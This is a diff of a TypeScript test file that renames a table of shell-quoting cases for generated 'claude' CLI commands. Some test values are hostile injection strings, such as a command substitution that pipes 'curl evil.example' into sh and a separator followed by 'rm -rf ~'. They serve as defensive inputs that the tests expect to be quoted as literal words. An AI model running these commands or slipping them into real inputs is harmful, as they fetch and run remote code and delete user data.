@@ -326,25 +326,25 @@ describe("card precedence notes", () => {
   }
 
   // POSIX single-quote form: a value outside the plain-path set → one literal word, never expanded or split
-  const quoteRows = [
-    { name: "a plain path stays bare", value: "/Users/owner/Desktop/git/glass-atrium", quoted: "/Users/owner/Desktop/git/glass-atrium" },
-    { name: "a space keeps the path one word", value: "/Users/owner/My Repos/app", quoted: "'/Users/owner/My Repos/app'" },
-    { name: "command substitution stays literal", value: "/tmp/x$(curl evil.example|sh)", quoted: "'/tmp/x$(curl evil.example|sh)'" },
-    { name: "a command separator stays literal", value: "/tmp/a; rm -rf ~", quoted: "'/tmp/a; rm -rf ~'" },
-    { name: "a backtick stays literal", value: "/tmp/`id`", quoted: "'/tmp/`id`'" },
-    { name: "an embedded single quote closes, escapes and reopens", value: "/tmp/it's", quoted: "'/tmp/it'\\''s'" },
+  const shellWordRows = [
+    { name: "a plain path stays bare", value: "/Users/owner/Desktop/git/glass-atrium", shellWord: "/Users/owner/Desktop/git/glass-atrium" },
+    { name: "a space keeps the path one word", value: "/Users/owner/My Repos/app", shellWord: "'/Users/owner/My Repos/app'" },
+    { name: "command substitution stays literal", value: "/tmp/x$(curl evil.example|sh)", shellWord: "'/tmp/x$(curl evil.example|sh)'" },
+    { name: "a command separator stays literal", value: "/tmp/a; rm -rf ~", shellWord: "'/tmp/a; rm -rf ~'" },
+    { name: "a backtick stays literal", value: "/tmp/`id`", shellWord: "'/tmp/`id`'" },
+    { name: "an embedded single quote closes, escapes and reopens", value: "/tmp/it's", shellWord: "'/tmp/it'\\''s'" },
   ];
-  for (const row of quoteRows) {
+  for (const row of shellWordRows) {
     test(`every value a rendered command carries is shell-quoted: ${row.name}`, () => {
       const listing = call<Array<string | { machine: string }>[]>("getCardNotesQ", buildItem({ session: markedSession(null, row.value) }))[0] ?? [];
       const listed = buildItem({ session: { ...markedSession(null), cwd: row.value } });
       const [cwdCommand] = (call<Array<string | { machine: string }>[]>("getCardNotesQ", listed)[0] ?? []).flatMap((part) => (typeof part === "string" ? [] : [part.machine]));
       const captured = call<Array<string | { machine: string }>[]>("getCardNotesQ", buildItem({ session: markedSession(row.value) }))[0] ?? [];
       const pull = collectText(render("CardStateQ", { item: buildItem({ status: "answered", deviation: "delivery_off" }), cliPath: row.value }));
-      assert.equal(cwdCommand, `claude agents --json --cwd ${row.quoted}`);
-      assert.ok(listing.some((part) => typeof part !== "string" && part.machine.startsWith(`CLAUDE_CONFIG_DIR=${row.quoted} claude `)), JSON.stringify(listing));
-      assert.ok(captured.some((part) => typeof part !== "string" && part.machine === `claude logs ${row.quoted}`), JSON.stringify(captured));
-      assert.ok(pull.includes(`${row.quoted} pending`), pull);
+      assert.equal(cwdCommand, `claude agents --json --cwd ${row.shellWord}`);
+      assert.ok(listing.some((part) => typeof part !== "string" && part.machine.startsWith(`CLAUDE_CONFIG_DIR=${row.shellWord} claude `)), JSON.stringify(listing));
+      assert.ok(captured.some((part) => typeof part !== "string" && part.machine === `claude logs ${row.shellWord}`), JSON.stringify(captured));
+      assert.ok(pull.includes(`${row.shellWord} pending`), pull);
     });
   }
 
